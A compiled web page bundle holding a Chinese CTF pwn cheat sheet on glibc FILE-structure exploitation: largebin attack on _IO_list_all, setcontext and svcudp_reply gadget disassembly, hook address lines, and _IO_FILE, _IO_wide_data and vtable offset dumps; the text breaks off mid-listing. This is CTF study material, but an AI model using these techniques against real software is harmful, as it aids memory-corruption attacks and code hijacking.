import{_ as n}from"./plugin-vue_export-helper-x3n3nnut.js";import{o as s,c as a,e as t}from"./app-pWcCQCWv.js";const p={},o=t(`<h1 id="pwn-io相关偏移" tabindex="-1"><a class="header-anchor" href="#pwn-io相关偏移" aria-hidden="true">#</a> pwn IO相关偏移</h1><blockquote><p>主要是因为有几次比赛,题基本打到IO了但是就剩下十分钟了根本调不通IO链,为了预防这种情况再次出现这里慢慢总结一下IO相关结构体和不同的攻击方式</p><p>这里主要是快捷提供了一些结构体以及偏移方便直接查询,这里的偏移以<strong>虚表</strong>为主,<strong>虚表实现</strong>主要是辅助我们查找函数的</p></blockquote><h2 id="gdb调试技巧" tabindex="-1"><a class="header-anchor" href="#gdb调试技巧" aria-hidden="true">#</a> gdb调试技巧</h2><ul><li><p>查看结构体的偏移量</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code>ptype <span class="token operator">/</span>o <span class="token keyword">struct</span> <span class="token class-name">xxxx</span> <span class="token comment">// 可以获取结构体的偏移量</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://awaqwqa.github.io/img/IO偏移/image-20241027104306803.png" alt="image-20241027104306803" tabindex="0" loading="lazy"><figcaption>image-20241027104306803</figcaption></figure></li><li><p>查看变量的类型</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code> ptype 变量 // 可以查看变量类型
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://awaqwqa.github.io/img/IO偏移/image-20241027104229082.png" alt="image-20241027104229082" tabindex="0" loading="lazy"><figcaption>image-20241027104229082</figcaption></figure></li></ul><h2 id="largebin-attack" tabindex="-1"><a class="header-anchor" href="#largebin-attack" aria-hidden="true">#</a> largebin attack</h2><blockquote><p>主要是通过构造lagrebin attack 修改<code>_IO_list_all</code> 然后</p><p>因为修改后的目标地址存储的是我们unsortedbin 并入进入lagrebin的那个chunk,所以前0x30是没有办法劫持的</p></blockquote><h2 id="magic-gadget" tabindex="-1"><a class="header-anchor" href="#magic-gadget" aria-hidden="true">#</a> magic_gadget</h2><ul><li><p>搜索mov 赋值相关gadget 可以查找 比如这里查找magic_gadget</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ROPgadget <span class="token parameter variable">--binary</span> ./libc.so.6 <span class="token parameter variable">--only</span> <span class="token string">&quot;mov|call&quot;</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">&quot;rdx&quot;</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">&quot;rax&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li></ul><h3 id="svcudp-reply" tabindex="-1"><a class="header-anchor" href="#svcudp-reply" aria-hidden="true">#</a> svcudp_reply</h3><blockquote><p>可以让rdi的值赋值给rbp</p></blockquote><h4 id="glibc2-38" tabindex="-1"><a class="header-anchor" href="#glibc2-38" aria-hidden="true">#</a> glibc2.38</h4><blockquote><p>其实就是edi+0x48位置赋值给rbp</p></blockquote><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code> <span class="token number">0x7f20cbd5336e</span> <span class="token operator">&lt;</span>svcudp_reply<span class="token operator">+</span><span class="token number">20</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    rbp<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x48</span><span class="token punctuation">]</span>
 <span class="token number">0x7f20cbd53372</span> <span class="token operator">&lt;</span>svcudp_reply<span class="token operator">+</span><span class="token number">24</span><span class="token operator">&gt;</span><span class="token operator">:</span>    lea    r13<span class="token punctuation">,</span><span class="token punctuation">[</span>rbp<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">]</span> 
 <span class="token number">0x7f20cbd53376</span> <span class="token operator">&lt;</span>svcudp_reply<span class="token operator">+</span><span class="token number">28</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    DWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0</span>
 <span class="token number">0x7f20cbd5337d</span> <span class="token operator">&lt;</span>svcudp_reply<span class="token operator">+</span><span class="token number">35</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    rax<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">]</span>
 <span class="token number">0x7f20cbd53381</span> <span class="token operator">&lt;</span>svcudp_reply<span class="token operator">+</span><span class="token number">39</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    esi<span class="token punctuation">,</span><span class="token number">0x0</span>
 <span class="token number">0x7f20cbd53386</span> <span class="token operator">&lt;</span>svcudp_reply<span class="token operator">+</span><span class="token number">44</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    rdi<span class="token punctuation">,</span>r13
 <span class="token number">0x7f20cbd53389</span> <span class="token operator">&lt;</span>svcudp_reply<span class="token operator">+</span><span class="token number">47</span><span class="token operator">&gt;</span><span class="token operator">:</span>    call   QWORD PTR <span class="token punctuation">[</span>rax<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="setcontext" tabindex="-1"><a class="header-anchor" href="#setcontext" aria-hidden="true">#</a> setcontext</h3><blockquote><p>rdi指向的地址赋值给各个寄存器 通常是setcontext + 53</p></blockquote><h4 id="通用" tabindex="-1"><a class="header-anchor" href="#通用" aria-hidden="true">#</a> 通用</h4><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code>setcontext_gadget <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;setcontext&quot;</span><span class="token punctuation">]</span> <span class="token operator">+</span>libc_base <span class="token operator">+</span> <span class="token number">53</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="glibc2-27" tabindex="-1"><a class="header-anchor" href="#glibc2-27" aria-hidden="true">#</a> glibc2.27</h3><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code>   <span class="token number">0x00007f4af8b2a085</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">53</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    rsp<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0xa0</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a08c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    rbx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x80</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a093</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">67</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    rbp<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x78</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a097</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">71</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    r12<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x48</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a09b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">75</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    r13<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a09f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">79</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    r14<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x58</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a0a3</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">83</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    r15<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x60</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a0a7</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">87</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    rcx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0xa8</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a0ae</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">94</span><span class="token operator">&gt;</span><span class="token operator">:</span>    push   rcx
   <span class="token number">0x00007f4af8b2a0af</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">95</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    rsi<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a0b3</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">99</span><span class="token operator">&gt;</span><span class="token operator">:</span>    mov    rdx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x88</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a0ba</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">106</span><span class="token operator">&gt;</span><span class="token operator">:</span>   mov    rcx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x98</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a0c1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">113</span><span class="token operator">&gt;</span><span class="token operator">:</span>   mov    r8<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a0c5</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">117</span><span class="token operator">&gt;</span><span class="token operator">:</span>   mov    r9<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a0c9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">121</span><span class="token operator">&gt;</span><span class="token operator">:</span>   mov    rdi<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x68</span><span class="token punctuation">]</span>
   <span class="token number">0x00007f4af8b2a0cd</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">125</span><span class="token operator">&gt;</span><span class="token operator">:</span>   xor    eax<span class="token punctuation">,</span>eax
   <span class="token number">0x00007f4af8b2a0cf</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">127</span><span class="token operator">&gt;</span><span class="token operator">:</span>   ret

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="hook" tabindex="-1"><a class="header-anchor" href="#hook" aria-hidden="true">#</a> hook</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>malloc_hook  <span class="token operator">=</span>  libc_base <span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;__malloc_hook&quot;</span><span class="token punctuation">]</span>
free_hook <span class="token operator">=</span>  libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;__free_hook&quot;</span><span class="token punctuation">]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="获取io结构体偏移" tabindex="-1"><a class="header-anchor" href="#获取io结构体偏移" aria-hidden="true">#</a> 获取IO结构体偏移</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>_IO_list_all <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;_IO_list_all&quot;</span><span class="token punctuation">]</span> <span class="token operator">+</span>libc_base
_IO_2_1_stdin <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;_IO_2_1_stdin_&quot;</span><span class="token punctuation">]</span> <span class="token operator">+</span>libc_base
_IO_2_1_stdout <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;_IO_2_1_stdout_&quot;</span><span class="token punctuation">]</span> <span class="token operator">+</span>libc_base
_IO_2_1_stderr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;_IO_2_1_stderr_&quot;</span><span class="token punctuation">]</span> <span class="token operator">+</span>libc_base
_IO_wfile_jumps <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;_IO_wfile_jumps&quot;</span><span class="token punctuation">]</span> <span class="token operator">+</span>libc_base
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_2-38" tabindex="-1"><a class="header-anchor" href="#_2-38" aria-hidden="true">#</a> 2.38</h2><h3 id="_2-38-1ubuntu4-amd64" tabindex="-1"><a class="header-anchor" href="#_2-38-1ubuntu4-amd64" aria-hidden="true">#</a> 2.38-1ubuntu4_amd64</h3><h4 id="io-file-plus结构体" tabindex="-1"><a class="header-anchor" href="#io-file-plus结构体" aria-hidden="true">#</a> _IO_FILE_plus结构体</h4><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span>
<span class="token punctuation">{</span>
    <span class="token comment">// _IO_FILE</span>
  FILE file<span class="token punctuation">;</span> 
  <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>vtable<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>然后其属性和对应偏移</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token number">0</span><span class="token operator">-</span><span class="token number">0xd8</span><span class="token operator">:</span>file
<span class="token number">0xd8</span><span class="token operator">:</span>vtable
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>file结构体 偏移</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token comment">/* offset    |  size */</span>  type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token punctuation">{</span>
<span class="token comment">/*    0      |     4 */</span>    <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>
<span class="token comment">/* XXX  4-byte hole  */</span>
<span class="token comment">/*    8      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_ptr<span class="token punctuation">;</span>
<span class="token comment">/*   16      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_end<span class="token punctuation">;</span>
<span class="token comment">/*   24      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_base<span class="token punctuation">;</span>
<span class="token comment">/*   32      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_base<span class="token punctuation">;</span>
<span class="token comment">/*   40      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_ptr<span class="token punctuation">;</span>
<span class="token comment">/*   48      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_end<span class="token punctuation">;</span>
<span class="token comment">/*   56      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_base<span class="token punctuation">;</span>
<span class="token comment">/*   64      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_end<span class="token punctuation">;</span>
<span class="token comment">/*   72      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span>
<span class="token comment">/*   80      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>
<span class="token comment">/*   88      |     8 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span>
<span class="token comment">/*   96      |     8 */</span>    <span class="token keyword">struct</span> <span class="token class-name">_IO_marker</span> <span class="token operator">*</span>_markers<span class="token punctuation">;</span>
<span class="token comment">/*  104      |     8 */</span>    <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_chain<span class="token punctuation">;</span>
<span class="token comment">/*  112      |     4 */</span>    <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span>
<span class="token comment">/*  116      |     4 */</span>    <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span>
<span class="token comment">/*  120      |     8 */</span>    __off_t _old_offset<span class="token punctuation">;</span>
<span class="token comment">/*  128      |     2 */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>
<span class="token comment">/*  130      |     1 */</span>    <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>
<span class="token comment">/*  131      |     1 */</span>    <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">/* XXX  4-byte hole  */</span>
<span class="token comment">/*  136      |     8 */</span>    _IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span>
<span class="token comment">/*  144      |     8 */</span>    __off64_t _offset<span class="token punctuation">;</span>
<span class="token comment">/*  152      |     8 */</span>    <span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span>_codecvt<span class="token punctuation">;</span>
<span class="token comment">/*  160      |     8 */</span>    <span class="token keyword">struct</span> <span class="token class-name">_IO_wide_data</span> <span class="token operator">*</span>_wide_data<span class="token punctuation">;</span>
<span class="token comment">/*  168      |     8 */</span>    <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_freeres_list<span class="token punctuation">;</span>
<span class="token comment">/*  176      |     8 */</span>    <span class="token keyword">void</span> <span class="token operator">*</span>_freeres_buf<span class="token punctuation">;</span>
<span class="token comment">/*  184      |     8 */</span>    <span class="token class-name">size_t</span> __pad5<span class="token punctuation">;</span>
<span class="token comment">/*  192      |     4 */</span>    <span class="token keyword">int</span> _mode<span class="token punctuation">;</span>
<span class="token comment">/*  196      |    20 */</span>    <span class="token keyword">char</span> _unused2<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

                           <span class="token comment">/* total size (bytes):  216 */</span>
                         <span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><h4 id="io-wide-data结构体" tabindex="-1"><a class="header-anchor" href="#io-wide-data结构体" aria-hidden="true">#</a> _IO_wide_data结构体</h4><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token comment">/* offset    |  size */</span>  type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_wide_data</span> <span class="token punctuation">{</span>
<span class="token comment">/*    0      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_read_ptr<span class="token punctuation">;</span>
<span class="token comment">/*    8      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_read_end<span class="token punctuation">;</span>
<span class="token comment">/*   16      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_read_base<span class="token punctuation">;</span>
<span class="token comment">/*   24      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_write_base<span class="token punctuation">;</span>
<span class="token comment">/*   32      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_write_ptr<span class="token punctuation">;</span>
<span class="token comment">/*   40      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_write_end<span class="token punctuation">;</span>
<span class="token comment">/*   48      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_buf_base<span class="token punctuation">;</span>
<span class="token comment">/*   56      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_buf_end<span class="token punctuation">;</span>
<span class="token comment">/*   64      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span>
<span class="token comment">/*   72      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>
<span class="token comment">/*   80      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span>
<span class="token comment">/*   88      |     8 */</span>    __mbstate_t _IO_state<span class="token punctuation">;</span>
<span class="token comment">/*   96      |     8 */</span>    __mbstate_t _IO_last_state<span class="token punctuation">;</span>
<span class="token comment">/*  104      |   112 */</span>    <span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token punctuation">{</span>
<span class="token comment">/*  104      |    56 */</span>        _IO_iconv_t __cd_in<span class="token punctuation">;</span>
<span class="token comment">/*  160      |    56 */</span>        _IO_iconv_t __cd_out<span class="token punctuation">;</span>

                               <span class="token comment">/* total size (bytes):  112 */</span>
                           <span class="token punctuation">}</span> _codecvt<span class="token punctuation">;</span>
<span class="token comment">/*  216      |     4 */</span>    <span class="token class-name">wchar_t</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">/* XXX  4-byte hole  */</span>
<span class="token comment">/*  224      |     8 */</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>_wide_vtable<span class="token punctuation">;</span>

                           <span class="token comment">/* total size (bytes):  232 */</span>
                         <span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="虚表" tabindex="-1"><a class="header-anchor" href="#虚表" aria-hidden="true">#</a> 虚表</h4><ul><li>虚表本质都是实现这个结构体,所以直接看这个结构体基本就行. 流程大概是先看代码调用了结构体vtable的哪个函数 然后通过这个函数找虚表实现看对应哪个结构体</li></ul><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token comment">/* offset    |  size */</span>  type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token punctuation">{</span>
<span class="token comment">/*    0      |     8 */</span>    <span class="token class-name">size_t</span> __dummy<span class="token punctuation">;</span>
<span class="token comment">/*    8      |     8 */</span>    <span class="token class-name">size_t</span> __dummy2<span class="token punctuation">;</span>
<span class="token comment">/*   16      |     8 */</span>    _IO_finish_t __finish<span class="token punctuation">;</span>
<span class="token comment">/*   24      |     8 */</span>    _IO_overflow_t __overflow<span class="token punctuation">;</span>
<span class="token comment">/*   32      |     8 */</span>    _IO_underflow_t __underflow<span class="token punctuation">;</span>
<span class="token comment">/*   40      |     8 */</span>    _IO_underflow_t __uflow<span class="token punctuation">;</span>
<span class="token comment">/*   48      |     8 */</span>    _IO_pbackfail_t __pbackfail<span class="token punctuation">;</span>
<span class="token comment">/*   56      |     8 */</span>    _IO_xsputn_t __xsputn<span class="token punctuation">;</span>
<span class="token comment">/*   64      |     8 */</span>    _IO_xsgetn_t __xsgetn<span class="token punctuation">;</span>
<span class="token comment">/*   72      |     8 */</span>    _IO_seekoff_t __seekoff<span class="token punctuation">;</span>
<span class="token comment">/*   80      |     8 */</span>    _IO_seekpos_t __seekpos<span class="token punctuation">;</span>
<span class="token comment">/*   88      |     8 */</span>    _IO_setbuf_t __setbuf<span class="token punctuation">;</span>
<span class="token comment">/*   96      |     8 */</span>    _IO_sync_t __sync<span class="token punctuation">;</span>
<span class="token comment">/*  104      |     8 */</span>    _IO_doallocate_t __doallocate<span class="token punctuation">;</span>
<span class="token comment">/*  112      |     8 */</span>    _IO_read_t __read<span class="token punctuation">;</span>
<span class="token comment">/*  120      |     8 */</span>    _IO_write_t __write<span class="token punctuation">;</span>
<span class="token comment">/*  128      |     8 */</span>    _IO_seek_t __seek<span class="token punctuation">;</span>
<span class="token comment">/*  136      |     8 */</span>    _IO_close_t __close<span class="token punctuation">;</span>
<span class="token comment">/*  144      |     8 */</span>    _IO_stat_t __stat<span class="token punctuation">;</span>
<span class="token comment">/*  152      |     8 */</span>    _IO_showmanyc_t __showmanyc<span class="token punctuation">;</span>
<span class="token comment">/*  160      |     8 */</span>    _IO_imbue_t __imbue<span class="token punctuation">;</span>

                           <span class="token comment">/* total size (bytes):  168 */</span>
                         <span class="token punctuation">}</span>


</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="虚表实现" tabindex="-1"><a class="header-anchor" href="#虚表实现" aria-hidden="true">#</a> 虚表实现</h4><blockquote><p>一般虚表的赋值都在libio/vtables.c文件里面</p></blockquote><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> __io_vtables<span class="token punctuation">[</span><span class="token punctuation">]</span> attribute_relro <span class="token operator">=</span>
<span class="token punctuation">{</span>
  <span class="token comment">/* _IO_str_jumps  */</span>
  <span class="token punctuation">[</span>IO_STR_JUMPS<span class="token punctuation">]</span> <span class="token operator">=</span>
  <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_str_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> _IO_str_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> _IO_str_underflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> _IO_default_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> _IO_str_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_default_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
